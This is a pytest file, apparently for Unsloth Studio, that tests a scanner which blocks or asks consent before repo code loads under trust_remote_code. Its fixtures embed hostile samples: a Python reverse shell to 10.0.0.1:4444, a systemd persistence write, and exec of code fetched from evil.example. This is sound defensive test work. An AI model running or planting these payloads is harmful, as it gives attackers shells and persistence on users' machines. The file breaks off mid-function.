# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved. See /studio/LICENSE.AGPL-3.0

"""Tests for the trust_remote_code consent gate.

The gate scans a repo's auto_map Python before a trust_remote_code=True load and
refuses CRITICAL/HIGH code unless the user pinned this exact version. The scanner
and fingerprint run for real; only the config/file fetch is stubbed.
"""

import os
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

import utils.security.consent as consent
from utils.security import (
    RemoteCodeDecision,
    evaluate_remote_code_consent,
    evaluate_remote_code_consent_for_targets,
    is_trusted_org_repo,
    remote_code_fingerprint,
    scan_remote_code_files,
    should_block_remote_code,
)
from huggingface_hub.utils import EntryNotFoundError

from utils.security.remote_code_scan import (
    CRITICAL,
    HIGH,
    REMOTE_CODE_CONFIG_FILES,
    RemoteCodeUnscannable,
    repo_remote_code_files,
)
from utils.security.trusted_org import clear_cache

_BACKEND = Path(__file__).resolve().parent.parent


@pytest.fixture(autouse = True)
def _clean_trusted_org_cache(monkeypatch):
    """Clear the trusted-org cache and force online mode for the Hub-verify path."""
    clear_cache()
    monkeypatch.delenv("HF_HUB_OFFLINE", raising = False)
    monkeypatch.delenv("TRANSFORMERS_OFFLINE", raising = False)
    yield
    clear_cache()


# HIGH severity (persistence install): approvable, blocks untrusted repos.
_HIGH = {
    "modeling_persist.py": (
        "open('/etc/systemd/system/x.service', 'w').write('[Service]\\nExecStart=sh')\n"
    )
}
# CRITICAL severity (reverse shell) - blocks even a first-party repo.
_CRITICAL = {
    "modeling_backdoor.py": (
        "import socket, subprocess, os\n"
        "s = socket.socket(); s.connect(('10.0.0.1', 4444))\n"
        "os.dup2(s.fileno(), 0); subprocess.call(['/bin/sh', '-i'])\n"
    )
}
_BENIGN = {
    "modeling_ok.py": (
        "import torch\n"
        "class MyModel(torch.nn.Module):\n"
        "    def forward(self, x):\n"
        "        return x + 1\n"
    )
}


def _with_auto_map(files):
    """Patch the gate so auto_map is present and the given files are returned."""
    return (
        patch.object(consent, "_config_has_auto_map", return_value = True),
        patch.object(consent, "repo_remote_code_files", return_value = files),
    )


class TestConsentGate:
    def test_disabled_is_a_noop(self):
        d = evaluate_remote_code_consent("unsloth/X", trust_remote_code = False)
        assert isinstance(d, RemoteCodeDecision)
        assert d.has_remote_code is False and d.blocked is False

    def test_no_auto_map_is_noop(self):
        with patch.object(consent, "_config_has_auto_map", return_value = False):
            d = evaluate_remote_code_consent("unsloth/Plain", trust_remote_code = True)
        assert d.has_remote_code is False
        assert d.blocked is False
        assert "no-op" in d.reason

    def test_unknown_auto_map_is_scanned_not_skipped(self):
        # Unreadable config (private/gated/offline) is "unknown", not "no code": scan, not no-op.
        with (
            patch.object(consent, "_config_has_auto_map", return_value = None),
            patch.object(consent, "repo_remote_code_files", return_value = _HIGH),
        ):
            d = evaluate_remote_code_consent(
                "private/evil", trust_remote_code = True, trusted_org = False
            )
        assert d.has_remote_code is True
        assert d.blocked is True
        assert "no-op" not in d.reason

    def test_benign_remote_code_allowed(self):
        a, b = _with_auto_map(_BENIGN)
        with a, b:
            d = evaluate_remote_code_consent("unsloth/Good", trust_remote_code = True)
        assert d.has_remote_code is True
        assert d.blocked is False
        assert d.fingerprint  # still fingerprinted for pinning

    def test_high_third_party_blocked(self):
        # HIGH from an untrusted repo: blocked but user-approvable (not CRITICAL).
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code = True, trusted_org = False
            )
        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.approvable is True
        assert d.max_severity == "HIGH"
        assert d.fingerprint
        # response payload is frontend-ready, with STRUCTURED findings.
        p = d.response_payload()
        assert p["error_kind"] == "remote_code_consent_required"
        assert p["approvable"] is True
        assert p["fingerprint"] == d.fingerprint
        assert isinstance(p["findings"], list) and p["findings"]
        f0 = p["findings"][0]
        assert {"severity", "file", "check"} <= set(f0)

    def test_high_first_party_requires_approval(self):
        # First-party is no longer a blanket bypass: HIGH code from a first-party repo
        # requires per-version approval like any other (approvable, unlike CRITICAL).
        # Real first-party models scan clean; this uses a synthetic HIGH payload.
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = evaluate_remote_code_consent(
                "unsloth/DeepSeek-OCR", trust_remote_code = True, trusted_org = True
            )
        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.approvable is True
        assert d.max_severity == "HIGH"
        assert d.fingerprint
        assert "approval required" in d.reason

    def test_bare_subprocess_blocked_third_party(self):
        # A bare subprocess.Popen in a config __init__: model code must never shell out, so block.
        files = {
            "configuration.py": (
                "import subprocess\n"
                "class RemoteConfig:\n"
                "    def __init__(self):\n"
                "        subprocess.Popen(['xcalc'])\n"
            )
        }
        a, b = _with_auto_map(files)
        with a, b:
            d = evaluate_remote_code_consent(
                "third-party/custom-model", trust_remote_code = True, trusted_org = False
            )
        assert d.blocked is True
        assert d.max_severity == "HIGH"
        assert "subprocess" in d.findings_summary.lower()

    def test_critical_blocked_even_first_party(self):
        # CRITICAL (reverse shell) blocks even a trusted first-party repo; not approvable.
        a, b = _with_auto_map(_CRITICAL)
        with a, b:
            d = evaluate_remote_code_consent(
                "unsloth/Compromised", trust_remote_code = True, trusted_org = True
            )
        assert d.blocked is True
        assert d.approvable is False
        assert d.max_severity == "CRITICAL"
        p = d.response_payload()
        assert p["error_kind"] == "remote_code_blocked"
        assert p["approvable"] is False

    def test_approved_fingerprint_unblocks(self):
        # HIGH (approvable) third-party code: a matching fingerprint unblocks.
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d1 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code = True, trusted_org = False
            )
            d2 = evaluate_remote_code_consent(
                "evil/Model",
                trust_remote_code = True,
                trusted_org = False,
                approved_fingerprint = d1.fingerprint,
            )
        assert d1.blocked is True
        assert d2.blocked is False
        assert d2.reason == "approved by fingerprint"

    def test_approved_fingerprint_does_not_unblock_critical(self):
        # CRITICAL is a hard block: a matching fingerprint must never override it.
        a, b = _with_auto_map(_CRITICAL)
        with a, b:
            d1 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code = True, trusted_org = False
            )
            d2 = evaluate_remote_code_consent(
                "evil/Model",
                trust_remote_code = True,
                trusted_org = False,
                approved_fingerprint = d1.fingerprint,
            )
        assert d1.blocked is True and d1.approvable is False
        assert d2.blocked is True and d2.approvable is False
        assert d2.reason == "blocked: scan found CRITICAL patterns"

    def test_wrong_fingerprint_still_blocked(self):
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = evaluate_remote_code_consent(
                "evil/Model",
                trust_remote_code = True,
                trusted_org = False,
                approved_fingerprint = "deadbeef",
            )
        assert d.blocked is True

    def test_combined_targets_one_fingerprint_approves_adapter_and_base(self):
        # A LoRA adapter and base that both ship auto_map code are scanned as one unit and
        # pinned by a single fingerprint over the union, so one approval unblocks the load.
        adapter_files = {"tokenization_adapter.py": "import subprocess\nsubprocess.Popen(['id'])\n"}
        base_files = {"modeling_base.py": "import subprocess\nsubprocess.Popen(['id'])\n"}

        def _files(name, hf_token = None):
            return adapter_files if name == "org/adapter" else base_files

        targets = ["org/adapter", "org/base"]
        with (
            patch.object(consent, "_config_has_auto_map", return_value = True),
            patch.object(consent, "repo_remote_code_files", side_effect = _files),
        ):
            d1 = evaluate_remote_code_consent_for_targets(targets, trust_remote_code = True)
            d2 = evaluate_remote_code_consent_for_targets(
                targets, trust_remote_code = True, approved_fingerprint = d1.fingerprint
            )
            base_only = evaluate_remote_code_consent_for_targets(
                ["org/base"], trust_remote_code = True
            )
        assert d1.blocked is True
        assert d1.max_severity == "HIGH"
        # The single combined fingerprint approves the whole load (adapter + base).
        assert d2.blocked is False
        assert d2.reason == "approved by fingerprint"
        # A fingerprint over the base alone must not match (no silent approval of adapter code).
        assert base_only.fingerprint != d1.fingerprint

    def test_fingerprint_is_casing_invariant_for_hub_repos(self):
        # The scan endpoint canonicalizes casing but workers pass raw input. The fingerprint
        # pins code bytes, not the repo-id spelling, so casing must not change it (else the
        # worker rejects the scan's approval as a mismatch).
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d1 = evaluate_remote_code_consent_for_targets(["Org/Model"], trust_remote_code = True)
            d2 = evaluate_remote_code_consent_for_targets(["org/model"], trust_remote_code = True)
        assert d1.fingerprint == d2.fingerprint
        # An approval pinned from one casing unblocks the load under another casing.
        a, b = _with_auto_map(_HIGH)
        with a, b:
            d3 = evaluate_remote_code_consent_for_targets(
                ["ORG/model"], trust_remote_code = True, approved_fingerprint = d1.fingerprint
            )
        assert d3.blocked is False
        assert d3.reason == "approved by fingerprint"

    def test_fingerprint_target_key_keeps_local_path_casing(self):
        from utils.security.consent import _fingerprint_target_key

        # A local path is case-sensitive (case-sensitive filesystems); never folded.
        with patch("utils.paths.is_local_path", return_value = True):
            assert _fingerprint_target_key("/Models/Foo") == "/Models/Foo"
        # A Hub repo id is case-insensitive; folded so the pin is casing-robust.
        with patch("utils.paths.is_local_path", return_value = False):
            assert _fingerprint_target_key("Org/Model") == "org/model"

    def test_unscannable_target_fails_closed_for_whole_load(self):
        # If ANY target is present-but-unscannable, the whole load fails closed (non-approvable).
        def _raise_for_base(name, hf_token = None):
            if name == "org/base":
                raise RemoteCodeUnscannable("gated")
            return {"modeling_adapter.py": "import torch\n"}

        with (
            patch.object(consent, "_config_has_auto_map", return_value = True),
            patch.object(consent, "repo_remote_code_files", side_effect = _raise_for_base),
        ):
            d = evaluate_remote_code_consent_for_targets(
                ["org/adapter", "org/base"], trust_remote_code = True
            )
        assert d.blocked is True
        assert d.approvable is False

    def test_medium_severity_blocks_pending_approval(self):
        # A MEDIUM finding is approvable but blocks until the fingerprint is pinned, so
        # trust_remote_code=True alone cannot run flagged code; a match then unblocks.
        # MEDIUM is rarely emitted, so the scan result is mocked to exercise the policy.
        from utils.security.remote_code_scan import MEDIUM

        class _MediumResult:
            max_severity = MEDIUM

            def summary(self):
                return "MEDIUM: large-base64-blob"

            def findings_payload(self):
                return [{"severity": "MEDIUM", "file": "modeling.py", "check": "large-base64-blob"}]

        with (
            patch.object(consent, "_config_has_auto_map", return_value = True),
            patch.object(consent, "repo_remote_code_files", return_value = {"m.py": "BLOB = 1\n"}),
            patch.object(consent, "scan_remote_code_files", return_value = _MediumResult()),
        ):
            d1 = evaluate_remote_code_consent(
                "third/medium", trust_remote_code = True, trusted_org = False
            )
            d2 = evaluate_remote_code_consent(
                "third/medium",
                trust_remote_code = True,
                trusted_org = False,
                approved_fingerprint = d1.fingerprint,
            )
        assert d1.blocked is True
        assert d1.approvable is True
        assert d1.max_severity == "MEDIUM"
        assert d1.fingerprint
        assert "MEDIUM" in d1.reason
        assert d2.blocked is False
        assert d2.reason == "approved by fingerprint"

    def test_fingerprint_changes_when_code_changes(self):
        ((fn, body),) = _HIGH.items()
        a1, b1 = _with_auto_map(_HIGH)
        with a1, b1:
            d1 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code = True, trusted_org = False
            )
        tampered = {fn: body + "\n# changed\n"}
        a2, b2 = _with_auto_map(tampered)
        with a2, b2:
            d2 = evaluate_remote_code_consent(
                "evil/Model", trust_remote_code = True, trusted_org = False
            )
        assert d1.fingerprint != d2.fingerprint  # pinned approval would re-prompt

    def test_unscannable_auto_map_blocked_fail_closed(self):
        # Code is shipped but could not be fetched/listed (gated/offline/transient):
        # repo_remote_code_files raises RemoteCodeUnscannable. Code we cannot see cannot
        # be verified or fingerprinted, so fail closed (hard, non-approvable block).
        with (
            patch.object(consent, "_config_has_auto_map", return_value = True),
            patch.object(
                consent,
                "repo_remote_code_files",
                side_effect = RemoteCodeUnscannable("gated"),
            ),
        ):
            d = evaluate_remote_code_consent("unsloth/Gated", trust_remote_code = True)
        assert d.has_remote_code is True
        assert d.blocked is True
        assert d.approvable is False
        assert "could not be scanned" in d.reason

    def test_auto_map_with_no_executable_code_is_a_noop(self):
        # auto_map declared but the repo ships no executable .py (listing succeeded,
        # returns {}) -- e.g. a GGUF repo with a vestigial auto_map. Nothing to run, so
        # trust_remote_code is a no-op and the load is allowed, not blocked.
        with (
            patch.object(consent, "_config_has_auto_map", return_value = True),
            patch.object(consent, "repo_remote_code_files", return_value = {}),
        ):
            d = evaluate_remote_code_consent(
                "unsloth/Llama-3_1-Nemotron-Ultra-253B-v1-GGUF", trust_remote_code = True
            )
        assert d.blocked is False
        assert d.has_remote_code is False
        assert "no-op" in d.reason


class TestWorkersWireTheGate:
    """Each load worker must call the gate and emit a remote_code_blocked error."""

    @pytest.mark.parametrize(
        "rel",
        [
            "core/training/worker.py",
            "core/inference/worker.py",
            "core/export/worker.py",
        ],
    )
    def test_worker_invokes_gate(self, rel):
        src = (Path(__file__).resolve().parent.parent / rel).read_text()
        assert "evaluate_remote_code_consent" in src
        assert "remote_code_blocked" in src
        assert ".blocked" in src

    def test_mlx_training_path_gates_before_load(self):
        # The Apple-Silicon path returns before run_training_process's gate, so it must
        # scan before FastMLXModel.from_pretrained runs repo code.
        src = (_BACKEND / "core/training/worker.py").read_text()
        head = src[: src.index("FastMLXModel.from_pretrained(")]
        assert "evaluate_remote_code_consent" in head

    def test_lora_base_model_is_gated(self):
        # Inference + export expand the consent scan to the LoRA base model's code.
        for rel in ("core/inference/worker.py", "core/export/worker.py"):
            src = (_BACKEND / rel).read_text()
            assert "evaluate_remote_code_consent" in src
            assert "get_base_model_from_lora" in src or "mc.base_model" in src

    def test_remote_lora_base_is_resolved_in_gate_paths(self):
        # validate / scan / training / export must resolve a remote adapter's base (not
        # just a local dir) so it is scanned, not silently trusted. (Inference gets the
        # resolved base from ModelConfig.base_model.)
        for rel in (
            "routes/inference.py",
            "routes/models.py",
            "core/training/worker.py",
            "core/export/worker.py",
        ):
            src = (_BACKEND / rel).read_text()
            assert "get_base_model_from_lora_identifier" in src, rel

    def test_embedding_training_path_gates_before_load(self):
        # The embedding pipeline must run the malware + consent gates before loading, like the other paths.
        src = (_BACKEND / "core/training/worker.py").read_text()
        start = src.index("def _run_embedding_training(")
        end = src.index("FastSentenceTransformer.from_pretrained(", start)
        region = src[start:end]
        assert "evaluate_file_security" in region
        assert "evaluate_remote_code_consent" in region


class TestCanonicalScannerSource:
    """In-repo, the load-time scanner must be the canonical scripts/scan_packages.py (the CI scanner), not the fallback."""

    def test_canonical_scanner_loads_in_repo(self):
        from utils.security.remote_code_scan import _load_canonical_scanner

        canon = _load_canonical_scanner()
        assert canon is not None, "scripts/scan_packages.py must load in-repo"
        assert hasattr(canon, "check_py_file")

    def test_gate_uses_canonical_combination_heuristics(self):
        # Combination heuristics are unique to the canonical scanner: a reverse shell is
        # CRITICAL there, proving the flat fallback is not in effect.
        from utils.security.remote_code_scan import scan_remote_code_files
        r = scan_remote_code_files(_CRITICAL)
        assert r.max_severity == "CRITICAL"


class TestStructuredFindingsForDialog:
    """The dialog needs structured findings + a fingerprint from the pre-check helper and scan route, with the approval threaded to workers."""

    def test_findings_payload_shape(self):
        from utils.security.remote_code_scan import scan_remote_code_files

        payload = scan_remote_code_files(_HIGH).findings_payload()
        assert payload
        for f in payload:
            assert {"severity", "file", "check", "evidence", "line", "snippet"} <= set(f)

    def test_snippet_locates_line_and_highlights_match(self):
        from utils.security.remote_code_scan import scan_remote_code_files

        src = (
            "import torch\n"  # 1
            "\n"  # 2
            "def build(expr):\n"  # 3
            "    fn = eval(expr)\n"  # 4  <- flagged
            "    return fn\n"  # 5
        )
        f = scan_remote_code_files({"modeling_x.py": src}).findings_payload()[0]
        assert f["line"] == 4
        rows = f["snippet"]
        match = [r for r in rows if r["is_match"]]
        assert len(match) == 1 and match[0]["number"] == 4
        # Precise column span isolates "eval(" within the line.
        seg = match[0]["text"][match[0]["match_start"] : match[0]["match_end"]]
        assert seg == "eval("
        # Context window present on both sides (clamped at file edges).
        assert any(r["number"] == 3 for r in rows)
        assert any(r["number"] == 5 for r in rows)

    def test_preflight_surfaces_findings(self):
        from utils.security import preflight_remote_code_consent

        a, b = _with_auto_map(_HIGH)
        with a, b:
            d = preflight_remote_code_consent("evil/Model", trusted_org = False)
        assert d.has_remote_code is True
        assert d.findings and d.fingerprint  # structured findings for the UI

    def test_scan_route_uses_preflight(self):
        src = (Path(__file__).resolve().parent.parent / "routes/models.py").read_text()
        assert "remote-code-scan" in src
        # The scan route pins one combined fingerprint over adapter + base, so adapter code is reviewed and approvable too.
        assert "preflight_remote_code_consent_for_targets" in src

    def _run_scan_route(self, monkeypatch, *, adapter, base, in_cache):
        """Call scan_model_remote_code with all network/cache deps stubbed; in_cache(repo)
        decides whether a repo pre-existed in cache (so it is not reported scan-created)."""
        import asyncio

        import routes.models as models_route
        import utils.models.model_config as model_config
        import utils.security as security

        monkeypatch.setattr(models_route, "is_local_path", lambda *_a, **_k: False)
        monkeypatch.setattr(models_route, "resolve_cached_repo_id_case", lambda n, *a, **k: n)
        monkeypatch.setattr(
            model_config, "get_base_model_from_lora_identifier", lambda *_a, **_k: base
        )
        monkeypatch.setattr(models_route, "_repo_in_any_hf_cache", lambda n, *a, **k: in_cache(n))
        monkeypatch.setattr(
            security,
            "preflight_remote_code_consent_for_targets",
            lambda *_a, **_k: SimpleNamespace(
                has_remote_code = False,
                response_payload = lambda: {"has_remote_code": False, "approvable": True},
            ),
        )
        monkeypatch.setattr(security, "security_load_subdirs", lambda *_a, **_k: ())
        monkeypatch.setattr(
            security,
            "evaluate_file_security",
            lambda *_a, **_k: SimpleNamespace(blocked = False, unsafe_files = []),
        )
        return asyncio.run(
            models_route.scan_model_remote_code(
                model_name = adapter, hf_token = None, current_subject = "tester"
            )
        )

    def test_scan_route_reports_all_scan_created_repos(self, monkeypatch):
        """A LoRA scan that pulls both adapter and base into cache reports every created
        repo, so a decline purges all of them, not just the primary."""
        adapter, base = "someone/lora-adapter", "someone/base-model"
        payload = self._run_scan_route(
            monkeypatch, adapter = adapter, base = base, in_cache = lambda _n: False
        )
        assert payload["scan_created_repos"] == [adapter, base]
        assert payload["created_by_scan"] is True

    def test_scan_route_omits_repo_already_cached(self, monkeypatch):
        """A base the user already had is not scan-created, so a decline purges only the new adapter."""
        adapter, base = "someone/lora-adapter", "someone/base-model"
        payload = self._run_scan_route(
            monkeypatch, adapter = adapter, base = base, in_cache = lambda n: n == base
        )
        assert payload["scan_created_repos"] == [adapter]
        assert payload["created_by_scan"] is True

    def test_scan_route_primary_already_cached_clears_created_by_scan(self, monkeypatch):
        """When only the base is new, created_by_scan is False but the base is still purged via scan_created_repos."""
        adapter, base = "someone/lora-adapter", "someone/base-model"
        payload = self._run_scan_route(
            monkeypatch, adapter = adapter, base = base, in_cache = lambda n: n == adapter
        )
        assert payload["scan_created_repos"] == [base]
        assert payload["created_by_scan"] is False

    def test_scan_route_purges_remote_adapter_downloaded_by_base_resolution(self, monkeypatch):
        """A remote adapter is reported scan-created even though resolving its base first
        caches the adapter's own adapter_config.json. Otherwise the adapter (and the
        auto_map .py the preflight fetched) is left on disk on decline. The static-lambda
        tests above miss this by not modeling base resolution's side effect."""
        import asyncio

        import routes.models as models_route
        import utils.models.model_config as model_config
        import utils.security as security
        import utils.security.remote_code_scan as rcs

        adapter, base = "someone/lora-adapter", "someone/base-model"
        cached: set = set()  # repos currently present in some HF cache

        def _get_base(name, token = None):
            # Resolving the base downloads the ADAPTER's adapter_config.json first.
            cached.add(adapter)
            return base

        monkeypatch.setattr(models_route, "is_local_path", lambda *_a, **_k: False)
        monkeypatch.setattr(models_route, "resolve_cached_repo_id_case", lambda n, *a, **k: n)
        monkeypatch.setattr(model_config, "get_base_model_from_lora_identifier", _get_base)
        monkeypatch.setattr(models_route, "_repo_in_any_hf_cache", lambda n, *a, **k: n in cached)
        monkeypatch.setattr(rcs, "external_auto_map_repos", lambda *_a, **_k: set())
        monkeypatch.setattr(
            security,
            "preflight_remote_code_consent_for_targets",
            lambda *_a, **_k: SimpleNamespace(
                has_remote_code = True,
                blocked = False,
                reason = "allowed: no high-risk patterns",
                response_payload = lambda: {"has_remote_code": True, "approvable": True},
            ),
        )
        monkeypatch.setattr(security, "security_load_subdirs", lambda *_a, **_k: ())
        monkeypatch.setattr(
            security,
            "evaluate_file_security",
            lambda *_a, **_k: SimpleNamespace(blocked = False, unsafe_files = []),
        )
        payload = asyncio.run(
            models_route.scan_model_remote_code(
                model_name = adapter, hf_token = None, current_subject = "tester"
            )
        )
        # The adapter must be purged on decline despite being cached mid-scan.
        assert adapter in payload["scan_created_repos"]
        assert base in payload["scan_created_repos"]
        assert payload["created_by_scan"] is True

    @pytest.mark.parametrize(
        "rel",
        [
            "core/training/training.py",
            "core/inference/orchestrator.py",
            "core/export/orchestrator.py",
            "routes/training.py",
            "routes/inference.py",
            "routes/export.py",
        ],
    )
    def test_fingerprint_threaded_to_worker(self, rel):
        src = (Path(__file__).resolve().parent.parent / rel).read_text()
        assert "approved_remote_code_fingerprint" in src
        # The per-user approval cache rides the same path as the fingerprint.
        assert "subject" in src


# Trusted-org auto-enable: is_trusted_org_repo decides whether a repo may auto-enable
# remote code without a prompt; it rejects local-path / spoofed names and fails closed.


def _fake_hfapi(resolved_id, author = "unsloth"):
    api = MagicMock()
    api.return_value.model_info.return_value = SimpleNamespace(id = resolved_id, author = author)
    return api


class TestIsTrustedOrgRepo:
    """Only a genuine unsloth/ or nvidia/ repo is trusted (Hub-verified); everything spoofed/malformed/unreachable fails closed."""

    def test_accepts_genuine_unsloth_repo(self):
        with patch("huggingface_hub.HfApi", _fake_hfapi("unsloth/DeepSeek-OCR")):
            assert is_trusted_org_repo("unsloth/DeepSeek-OCR") is True

    def test_accepts_genuine_nvidia_repo(self):
        with patch("huggingface_hub.HfApi", _fake_hfapi("nvidia/Nemotron-H-8B", author = "nvidia")):
            assert is_trusted_org_repo("nvidia/Nemotron-H-8B") is True

    def test_local_path_spoofs_rejected(self):
        # Names that look trusted after stripping but are local paths.
        for n in ["./unsloth/evil", "/tmp/unsloth/x", "~/unsloth/x", ".\\unsloth\\x"]:
            assert is_trusted_org_repo(n, verify_remote = False) is False, n

    def test_rejects_local_path_even_if_is_local_path_says_so(self):
        # Defensive: a bare "unsloth/x" that resolves as a local dir must fail.
        with patch("utils.security.trusted_org.is_local_path", return_value = True):
            assert is_trusted_org_repo("unsloth/x") is False

    def test_local_dir_shadowing_trusted_name_rejected(self, tmp_path, monkeypatch):
        # A local dir literally named "unsloth/evil" must be rejected before any Hub call, even with remote verify on.
        monkeypatch.chdir(tmp_path)
        (tmp_path / "unsloth" / "evil").mkdir(parents = True)
        clear_cache()
        with patch("huggingface_hub.HfApi") as Api:
            assert is_trusted_org_repo("unsloth/evil") is False
            Api.assert_not_called()

    def test_untrusted_namespaces_rejected(self):
        for n in ["evil/unsloth-clone", "unsloth-evil/x", "nvidiaa/x", "huggingface/x"]:
            assert is_trusted_org_repo(n, verify_remote = False) is False, n

    def test_malformed_names_rejected(self):
        for n in ["", "gpt2", "unsloth", "a/b/c", "/x", "unsloth/", "/unsloth", None]:
            assert is_trusted_org_repo(n, verify_remote = False) is False, repr(n)

    def test_rejects_when_resolved_owner_is_not_trusted(self):
        # Name says unsloth/ but the Hub resolves it elsewhere -> fail closed.
        with patch("huggingface_hub.HfApi", _fake_hfapi("someoneelse/x", author = "someoneelse")):
            assert is_trusted_org_repo("unsloth/x") is False

    def test_fails_closed_when_hub_raises(self):
        for exc in (ConnectionError("net"), Exception("404"), TimeoutError("t")):
            clear_cache()
            api = MagicMock()
            api.return_value.model_info.side_effect = exc
            with patch("huggingface_hub.HfApi", api):
                assert is_trusted_org_repo("unsloth/maybe-real") is False

    def test_offline_trusts_shape_without_hub(self, monkeypatch):
        # Offline: trust the namespace shape without ever touching the Hub.
        monkeypatch.setenv("HF_HUB_OFFLINE", "1")
        clear_cache()
        with patch("huggingface_hub.HfApi") as Api:
            assert is_trusted_org_repo("unsloth/Local-Cached") is True
            assert is_trusted_org_repo("nvidia/Nemotron-H-x") is True
            assert is_trusted_org_repo("evil/x") is False
            Api.assert_not_called()

    def test_token_failure_does_not_poison_authed_lookup(self):
        # Cache is keyed by token: an unauthenticated failure must not poison a later authed call.
        clear_cache()
        api = MagicMock()
        api.return_value.model_info.side_effect = [
            Exception("401 gated"),  # no token -> fails closed
            SimpleNamespace(id = "unsloth/Private", author = "unsloth"),  # token -> resolves
        ]
        with patch("huggingface_hub.HfApi", api):
            assert is_trusted_org_repo("unsloth/Private") is False
            assert is_trusted_org_repo("unsloth/Private", hf_token = "hf_xyz") is True


class TestNemotronGateUsesTrustCheck:
    """The NemotronH auto-enable in all three workers is gated on is_trusted_org_repo, so a spoofed nemotron-named repo never auto-enables."""

    @pytest.mark.parametrize(
        "rel",
        [
            "core/training/worker.py",
            "core/inference/worker.py",
            "core/export/worker.py",
        ],
    )
    def test_worker_nemotron_block_calls_trust_check(self, rel):
        src = (_BACKEND / rel).read_text()
        assert "_NEMOTRON_TRUST_SUBSTRINGS" in src
        assert "is_trusted_org_repo(" in src

    def test_gate_predicate_blocks_spoof_allows_trusted(self):
        # Reproduce the worker predicate with the REAL is_trusted_org_repo.
        subs = ("nemotron_h", "nemotron-h", "nemotron-3-nano")

        def gate(name):
            low = name.lower()
            return (
                any(s in low for s in subs)
                and (low.startswith("unsloth/") or low.startswith("nvidia/"))
                and is_trusted_org_repo(name, verify_remote = False)
            )

        with patch.dict(os.environ, {"HF_HUB_OFFLINE": "1"}):
            clear_cache()
            assert gate("unsloth/Nemotron-H-8B") is True
        clear_cache()
        assert gate("evil/nemotron_h-backdoor") is False  # spoofed namespace
        assert gate("unsloth/llama-3-8b") is False  # not nemotron


# Raw scanner behaviour + coverage: scan_remote_code_files flags dangerous patterns
# and agrees with the CI auditor; repo_remote_code_files must scan every .py the
# loader could execute and fail closed on a partial remote snapshot.

_SCAN_MALICIOUS = (
    "import os, subprocess, urllib.request, base64\n"
    "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
    "exec(urllib.request.urlopen('http://evil.example/x').read())\n"
    "__import__('o' + 's').system('whoami')\n"
    "BLOB = '" + ("QWxhZGRpbjpvcGVuc2VzYW1l" * 20) + "'\n"
)
_SCAN_BENIGN = (
    "import torch\nfrom torch import nn\n"
    "from transformers import PreTrainedModel\n"
    "class DeepseekOCRForCausalLM(PreTrainedModel):\n"
    "    def forward(self, x):\n        return self.proj(x)\n"
)


class TestRemoteCodeScan:
    def test_flags_malicious(self):
        res = scan_remote_code_files({"modeling_evil.py": _SCAN_MALICIOUS})
        assert not res.clean
        assert res.max_severity in (CRITICAL, HIGH)
        assert res.findings
        assert should_block_remote_code(res) is True

    def test_benign_is_clean(self):
        res = scan_remote_code_files({"modeling_ok.py": _SCAN_BENIGN})
        assert res.clean, res.summary()
        assert should_block_remote_code(res) is False

    def test_only_python_is_scanned(self):
        res = scan_remote_code_files({"weights.bin": _SCAN_MALICIOUS, "README.md": _SCAN_MALICIOUS})
        assert res.clean

    def test_fingerprint_stable_and_sensitive(self):
        a = remote_code_fingerprint({"m.py": _SCAN_BENIGN})
        b = remote_code_fingerprint({"m.py": _SCAN_BENIGN})
        c = remote_code_fingerprint({"m.py": _SCAN_BENIGN + "\n# changed"})
        assert a == b
        assert a != c

    def test_scanner_faithful_to_scan_packages(self):
        # The vendored load-time scanner agrees with the CI auditor that the file is dangerous.
        sp = _BACKEND.parents[1] / "scripts" / "scan_packages.py"
        if not sp.is_file():
            pytest.skip("scan_packages.py not present")
        import importlib.util

        spec = importlib.util.spec_from_file_location("scan_packages_probe", sp)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        assert len(mod.check_py_file(_SCAN_MALICIOUS, "modeling_x.py", "pkg")) > 0
        assert not scan_remote_code_files({"modeling_x.py": _SCAN_MALICIOUS}).clean


class TestConsentProvider:
    """_consent_provider attributes the dialog's `from "<provider>"` tag only when safe."""

    @staticmethod
    def _fn():
        from routes.models import _consent_provider
        return _consent_provider

    def test_single_hub_id_returns_owner(self):
        assert self._fn()("NVIDIA/Nemotron", ["NVIDIA/Nemotron"]) == "NVIDIA"
        assert self._fn()("NVIDIA/Nemotron", ["NVIDIA/Nemotron"], []) == "NVIDIA"

    def test_multi_target_lora_returns_none(self):
        # A LoRA scans adapter + base; attributing to one would mislead.
        assert self._fn()("user/adapter", ["user/adapter", "NVIDIA/base"]) is None

    def test_external_auto_map_ref_returns_none(self):
        # A single repo whose auto_map pulls code from another repo: don't attribute it.
        assert self._fn()("owner/repo", ["owner/repo"], ["evilorg/evilrepo"]) is None

    def test_local_path_returns_none(self, tmp_path):
        d = tmp_path / "org" / "model"
        d.mkdir(parents = True)
        assert self._fn()(str(d), [str(d)]) is None
        assert self._fn()("/home/me/model", ["/home/me/model"]) is None

    def test_non_canonical_id_returns_none(self):
        fn = self._fn()
        assert fn("a/b/c", ["a/b/c"]) is None
        assert fn("/repo", ["/repo"]) is None
        assert fn("plainname", ["plainname"]) is None


class TestScannerCoversAllExecutableCode:
    """repo_remote_code_files must collect every .py the loader could execute, so the fingerprint can't certify unscanned code."""

    def test_local_scan_is_recursive(self, tmp_path):
        # A nested helper module (imported by modeling_*.py) must be scanned too.
        (tmp_path / "config.json").write_text('{"auto_map": {"AutoModel": "modeling_x.M"}}')
        (tmp_path / "modeling_x.py").write_text("from .helpers import sub\n")
        nested = tmp_path / "helpers"
        nested.mkdir()
        (nested / "sub.py").write_text("import os\nos.system('id')\n")
        files = repo_remote_code_files(str(tmp_path))
        assert "modeling_x.py" in files
        assert str(Path("helpers") / "sub.py") in files

    def test_remote_partial_download_is_unscannable(self):
        # config.json fetches but a referenced .py 404s: a partial set would fingerprint
        # "clean" while transformers later runs the missing file, so fail closed.
        def _dl(
            repo,
            fn,
            token = None,
        ):
